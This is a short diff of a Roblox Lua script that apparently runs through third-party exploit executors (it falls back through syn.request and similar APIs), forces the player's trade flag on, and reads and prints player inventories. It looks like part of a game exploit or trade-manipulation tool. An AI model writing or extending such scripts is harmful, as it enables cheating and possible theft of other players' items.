@@ -14,7 +14,6 @@ local PlayersService = game:GetService("Players")
 
 local http_request = http_request or request or HttpPost or syn.request
 
-
 local LocalPlayer = PlayersService.LocalPlayer
 
 LocalPlayer.ActiveTrade.Value = true
@@ -27,7 +26,6 @@ task.spawn(function()
 	end)
 
 end)
-
 
 task.spawn(function()
 	local PlayersService = game:GetService("Players")
@@ -169,5 +167,9 @@ end
 task.spawn(function()
 	task.wait(1)
 
-	local inventory = GetPlayerInventory(LocalPlayer)
+	local inventory = RequestPlayerInventory(LocalPlayer)
+	
+	for i, v in next, inventory do
+		print(i,v)
+	end
 end)
